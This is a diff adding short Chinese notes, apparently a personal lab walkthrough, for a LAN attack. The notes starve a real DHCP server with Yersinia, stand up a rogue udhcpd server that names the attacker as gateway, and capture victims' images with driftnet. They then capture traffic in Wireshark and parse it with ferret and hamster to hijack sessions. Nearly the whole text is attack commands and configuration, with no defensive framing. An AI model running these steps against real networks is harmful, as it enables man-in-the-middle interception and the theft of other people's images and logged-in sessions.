@@ -1,0 +1,35 @@
+DHCP会话劫持
+开启路由转发
+echo 1 >/proc/sys/net/ipv4/ip_forward
+攻击正常的DHCP服务器
+Yersinia –G
+Launch attack
+DHCP
+sending DISCOVER packet
+安装DHCP服务器udhcpd
+
+vim /etc/udhcpd.conf
+更改网段
+start		192.168.*.*
+end		192.168.*.254
+在#Examles下有个opt router改为ifconfig查询到的你的ip address
+
+启动DHCP服务器
+service udhcpd start
+
+检查是否走的攻击者的DHCP服务器
+netstat –r
+default无对应也没有关系，不知道为什么我的就是没有对应我的ip address
+
+抓取靶机图片
+driftnet -i eth0
+
+wireshark会话劫持
+打开wireshark抓取网络流量
+用ferret解析.pcap文件
+ferret -r *.pcap
+会生成一个hamster.txt文件
+运行hamster，主机会开启1234port
+配置代理
+检查是否劫持成功
+
